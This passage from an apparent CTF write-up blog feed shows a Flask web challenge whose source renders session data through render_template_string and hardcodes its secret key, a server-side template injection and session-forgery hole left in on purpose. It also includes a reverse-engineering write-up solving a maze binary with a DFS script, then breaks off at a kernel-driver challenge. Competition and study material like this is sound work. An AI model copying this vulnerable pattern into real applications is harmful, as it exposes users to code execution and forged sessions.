class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, make_response, render_template_string<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret_key, secret_payload, <span class="hljs-built_in">filter</span><br><br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index_handler</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = request.form[<span class="hljs-string">&#x27;name&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;who are you!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload = secret_payload<br>            session[<span class="hljs-string">&#x27;role&#x27;</span>] = payload<br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;Hello,Huster, your name is &#123;&#123;var&#125;&#125;&quot;</span>, var=name)<br>    <span class="hljs-keyword">else</span>:<br>        rsp = make_response(<span class="hljs-string">&quot;try to post &#x27;name&#x27;&quot;</span>)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;tell you a secret: /nonono&quot;</span><br>        <span class="hljs-keyword">return</span> rsp<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/nonono&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&#x27;nonono&#x27;</span>):]<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        role = session.get(<span class="hljs-string">&#x27;role&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(role, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No, you are a hacker!&#x27;</span><br>    <span class="hljs-keyword">if</span> role.get(<span class="hljs-string">&#x27;is_admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>        flag = role.get(<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;admin&#x27;</span><br>        flag = <span class="hljs-built_in">filter</span>(flag)<br>        message = <span class="hljs-string">&quot;%s, God bless you! The flag is &quot;</span> % flag<br>        <span class="hljs-keyword">return</span> render_template_string(message)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: Permission denied!&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># secret.py</span><br>secret_key = <span class="hljs-string">&#x27;Th1s@one!seCret!&#x27;</span><br>secret_payload = &#123;<br>                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>                <span class="hljs-string">&quot;is_admin&quot;</span>: <span class="hljs-number">0</span>,<br>                <span class="hljs-string">&quot;secret_key&quot;</span>: <span class="hljs-string">&#x27;VGgxc0BvbmUhc2VDcmV0IQ==&#x27;</span><br>            &#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">flag</span>):<br>    <span class="hljs-keyword">return</span> flag.replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长城杯2024决赛RE</title>
    <link href="/2024/05/25/ctf_wp/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%86%B3%E8%B5%9BRE/"/>
    <url>/2024/05/25/ctf_wp/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%86%B3%E8%B5%9BRE/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>长城杯决赛只看了CTF的RE题目，题目挺常规，坐牢8小时拿下3.5道题，勉强混个逆向专项奖。</p><h2 id="mapamp"><a href="#mapamp" class="headerlink" title="mapamp"></a>mapamp</h2><p>迷宫题，输入<code>wasd</code>控制移动方向，<code>x == 38, y == 38</code>出口，迷宫没有直接存在内存中，需要每步计算判断是否<code>die</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_404340</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v0; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// rdx</span><br>  __int64 v2; <span class="hljs-comment">// rcx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> y; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> x; <span class="hljs-comment">// r13d</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// al</span><br>  __int64 v8; <span class="hljs-comment">// rbp</span><br>  __int64 v9; <span class="hljs-comment">// r15</span><br>  __int64 v10; <span class="hljs-comment">// rax</span><br>  __int64 v11; <span class="hljs-comment">// rax</span><br>  __int64 v12; <span class="hljs-comment">// rdx</span><br>  _BOOL8 v13; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// rdi</span><br>  __int64 *v15; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int64 v16; <span class="hljs-comment">// r12</span><br>  __int64 v17; <span class="hljs-comment">// rax</span><br>  __int64 v19; <span class="hljs-comment">// [rsp+0h] [rbp-78h]</span><br>  __int64 v20; <span class="hljs-comment">// [rsp+0h] [rbp-78h]</span><br>  __int64 *v21; <span class="hljs-comment">// [rsp+10h] [rbp-68h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 len; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v23[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-58h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v24; <span class="hljs-comment">// [rsp+38h] [rbp-40h]</span><br><br>  v24 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  sub_404C00();<br>  v0 = (<span class="hljs-type">unsigned</span> __int64)&amp;v21;<br>  len = <span class="hljs-number">0LL</span>;<br>  v21 = v23;<br>  LOBYTE(v23[<span class="hljs-number">0</span>]) = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">scanf</span>(&amp;unk_648560, &amp;v21);<br>  v3 = qword_647530;<br>  <span class="hljs-keyword">if</span> ( len != <span class="hljs-number">140</span> )<br>    die();<br>  v4 = <span class="hljs-number">0LL</span>;<br>  y = <span class="hljs-number">0</span>;<br>  x = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v7 = *((_BYTE *)v21 + v4);<br>    <span class="hljs-keyword">if</span> ( v7 == <span class="hljs-string">&#x27;w&#x27;</span> )<br>    &#123;<br>      v8 = *(_QWORD *)(v3 + <span class="hljs-number">16</span>);<br>      --y;<br>      v9 = v3 + <span class="hljs-number">8</span>;<br>      <span class="hljs-keyword">if</span> ( !v8 )<br>        <span class="hljs-keyword">goto</span> LABEL_40;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( v7 )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>          ++y;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>          --x;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>          ++x;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>          die();<br>      &#125;<br>      v8 = *(_QWORD *)(v3 + <span class="hljs-number">16</span>);<br>      v9 = v3 + <span class="hljs-number">8</span>;<br>      <span class="hljs-keyword">if</span> ( !v8 )<br>      &#123;<br>LABEL_40:<br>        v8 = v9;<br>LABEL_18:<br>        v19 = v8;<br>        v8 = sub_470DE0(<span class="hljs-number">96LL</span>, v0, v1, v2);<br>        *(_DWORD *)(v8 + <span class="hljs-number">32</span>) = y;<br>        *(_OWORD *)(v8 + <span class="hljs-number">56</span>) = <span class="hljs-number">0LL</span>;<br>        *(_OWORD *)(v8 + <span class="hljs-number">72</span>) = <span class="hljs-number">0LL</span>;<br>        *(_QWORD *)(v8 + <span class="hljs-number">88</span>) = <span class="hljs-number">0LL</span>;<br>        *(_QWORD *)(v8 + <span class="hljs-number">40</span>) = v8 + <span class="hljs-number">88</span>;<br>        *(_QWORD *)(v8 + <span class="hljs-number">48</span>) = <span class="hljs-number">1LL</span>;<br>        *(_DWORD *)(v8 + <span class="hljs-number">72</span>) = <span class="hljs-number">1065353216</span>;<br>        v11 = sub_46F910(v3, v19, v8 + <span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">if</span> ( v12 )<br>        &#123;<br>          v13 = v11 || v9 == v12 || y &lt; *(_DWORD *)(v12 + <span class="hljs-number">32</span>);<br>          v0 = v8;<br>          sub_479520(v13, v8, v12, v9);<br>          ++*(_QWORD *)(v3 + <span class="hljs-number">40</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v0 = <span class="hljs-number">96LL</span>;<br>          v20 = v11;<br>          sub_46FF40(v8, <span class="hljs-number">96LL</span>);<br>          v8 = v20;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_23;<br>      &#125;<br>    &#125;<br>    v2 = v9;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v1 = *(_QWORD *)(v8 + <span class="hljs-number">16</span>);<br>      v10 = *(_QWORD *)(v8 + <span class="hljs-number">24</span>);<br>      <span class="hljs-keyword">if</span> ( y &gt; *(_DWORD *)(v8 + <span class="hljs-number">32</span>) )<br>        <span class="hljs-keyword">break</span>;<br>LABEL_13:<br>      <span class="hljs-keyword">if</span> ( !v1 )<br>        <span class="hljs-keyword">goto</span> LABEL_16;<br>      v2 = v8;<br>      v8 = v1;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v10 )<br>    &#123;<br>      v8 = v10;<br>      v1 = *(_QWORD *)(v10 + <span class="hljs-number">16</span>);<br>      v10 = *(_QWORD *)(v10 + <span class="hljs-number">24</span>);<br>      <span class="hljs-keyword">if</span> ( y &lt;= *(_DWORD *)(v8 + <span class="hljs-number">32</span>) )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>    &#125;<br>    v8 = v2;<br>LABEL_16:<br>    <span class="hljs-keyword">if</span> ( v8 == v9 || y &lt; *(_DWORD *)(v8 + <span class="hljs-number">32</span>) )<br>      <span class="hljs-keyword">goto</span> LABEL_18;<br>LABEL_23:<br>    v14 = *(_QWORD *)(v8 + <span class="hljs-number">48</span>);<br>    v1 = x % v14;<br>    v15 = *(__int64 **)(*(_QWORD *)(v8 + <span class="hljs-number">40</span>) + <span class="hljs-number">8</span> * v1);<br>    v16 = v1;<br>    <span class="hljs-keyword">if</span> ( v15 )<br>    &#123;<br>      v2 = *v15;<br>      v0 = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(*v15 + <span class="hljs-number">8</span>);<br>      <span class="hljs-keyword">while</span> ( x != (_DWORD)v0 )<br>      &#123;<br>        v2 = *(_QWORD *)v2;<br>        <span class="hljs-keyword">if</span> ( v2 )<br>        &#123;<br>          v0 = *(<span class="hljs-type">int</span> *)(v2 + <span class="hljs-number">8</span>);<br>          v1 = v0 % v14;<br>          <span class="hljs-keyword">if</span> ( v16 == v0 % v14 )<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_28;<br>      &#125;<br>      v2 += <span class="hljs-number">16LL</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>LABEL_28:<br>      v17 = sub_470DE0(<span class="hljs-number">24LL</span>, v0, v1, v2);<br>      *(_QWORD *)v17 = <span class="hljs-number">0LL</span>;<br>      v0 = x % v14;<br>      *(_DWORD *)(v17 + <span class="hljs-number">8</span>) = x;<br>      *(_QWORD *)(v17 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;<br>      v2 = sub_46FD80(v8 + <span class="hljs-number">40</span>, v16, x, v17, <span class="hljs-number">1LL</span>) + <span class="hljs-number">16</span>;<br>    &#125;<br>    v3 = *(_QWORD *)v2;<br>    <span class="hljs-keyword">if</span> ( !*(_QWORD *)v2 )<br>      die();<br>    ++v4;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( len &gt; v4 );<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">38</span> &amp;&amp; y == <span class="hljs-number">38</span> )<br>    <span class="hljs-built_in">printf</span>(qword_648440, <span class="hljs-string">&quot;flag&#123;md5(your input)&#125;&quot;</span>, <span class="hljs-number">21LL</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(qword_648440, <span class="hljs-string">&quot;wrong&quot;</span>, <span class="hljs-number">5LL</span>);<br>  sub_404B60(qword_648440);<br>  <span class="hljs-keyword">if</span> ( v21 != v23 )<br>    sub_46FF40(v21, v23[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( v24 != __readfsqword(<span class="hljs-number">0x28</span>u) )<br>    sub_59B4A0();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于是逐字符校验，出错直接<code>die</code>，可以考虑获取<code>die</code>的时候已校验的长度，即已走的步数，通过遍历4个方向检查走的步数是否增加，如果步数增加，则表明新的方向可以走，如果步数不变，表示新的方向不可走，使用dfs即可走出迷宫</p><p>已走的步数存在<code>r14</code>寄存器中，可以修改<code>die</code>函数，在<code>die</code>函数内输出r14寄存器的值，也可以patch main函数，将<code>die</code>修改为返回<code>r14</code>寄存器的值，这里选择patch main函数</p><p><img src="assets/2024-05-31-16-51-47-image.png"></p><p><img src="assets/2024-05-31-16-55-44-image.png"></p><p>接下来使用dfs遍历迷宫，找到正确路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/en python</span><br><br><span class="hljs-keyword">import</span> subprocess<br><br>maze = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">x=<span class="hljs-number">0</span>, y=<span class="hljs-number">0</span>, idx=<span class="hljs-number">0</span>, path=[]</span>):<br>    <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-built_in">len</span>(path)):<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">global</span> maze<br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;wasd&quot;</span>:<br>        tmp_path = path.copy()<br>        tmp_x = x<br>        tmp_y = y<br>        tmp_path[idx] = d.encode()<br>        <span class="hljs-keyword">match</span>(d):<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>                tmp_y -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>                tmp_y += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>                tmp_x -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>                tmp_x += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (maze[tmp_x][tmp_y] == <span class="hljs-number">1</span>):<br>            <span class="hljs-comment"># 已经走过的 避免死循环</span><br>            <span class="hljs-keyword">continue</span><br>        proc = subprocess.run(<span class="hljs-string">&quot;./mapmap&quot;</span>, <span class="hljs-built_in">input</span>=<span class="hljs-string">b&#x27;&#x27;</span>.join(tmp_path))<br>        next_idx = proc.returncode<br>        <span class="hljs-keyword">if</span> (tmp_x == <span class="hljs-number">38</span> <span class="hljs-keyword">and</span> tmp_y == <span class="hljs-number">38</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(tmp_path))<br>        <span class="hljs-keyword">if</span> (next_idx == idx):<br>            <span class="hljs-comment"># 路径长度不变 不可走</span><br>            <span class="hljs-keyword">continue</span><br>        maze[tmp_x][tmp_y] = <span class="hljs-number">1</span><br>        dfs(tmp_x, tmp_y, idx+<span class="hljs-number">1</span>, tmp_path)<br><br>maze[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>path = [<span class="hljs-string">b&#x27;w&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">140</span>)]<br>dfs(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, path)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>        <span class="hljs-built_in">print</span>(maze[x][y], end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ python ex.py<br>wrong<br>wrong<br>wrong<br>wrong<br>b<span class="hljs-string">&#x27;ssssddwwwwddddssaassssssaassddssaassddssddssssssddssaassddssddwwddssssddwwddddssssssssssddddddddddwwddssddddddwwwdsssdwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>flag&#123;md5(your input)&#125;<br>b<span class="hljs-string">&#x27;ssssddwwwwddddssaassssssaassddssaassddssddssssssddssaassddssddwwddssssddwwddddssssssssssddddddddddwwddssddddddwwaawwddwwaaaawwddddddssssssss&#x27;</span><br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br>wrong<br><br></code></pre></td></tr></table></figure><p>正确的迷宫路径<code>ssssddwwwwddddssaassssssaassddssaassddssddssssssddssaassddssddwwddssssddwwddddssssssssssddddddddddwwddssddddddwwaawwddwwaaaawwddddddssssssss</code></p><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>windows sys驱动题，exe文件利用驱动提供的功能处理输入的flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+40h] [rbp+0h] BYREF</span><br>  <span class="hljs-type">int</span> v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+48h] [rbp+8h] BYREF</span><br>  <span class="hljs-type">char</span> ret_str[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [rsp+68h] [rbp+28h] BYREF</span><br>  <span class="hljs-type">int</span> v9[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+A4h] [rbp+64h] BYREF</span><br>  <span class="hljs-type">char</span> flag[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [rsp+C8h] [rbp+88h] BYREF</span><br>  <span class="hljs-type">char</span> v11; <span class="hljs-comment">// [rsp+104h] [rbp+C4h]</span><br>  <span class="hljs-type">char</span> v12; <span class="hljs-comment">// [rsp+124h] [rbp+E4h]</span><br><br>  v3 = &amp;v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">66</span>i64; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = <span 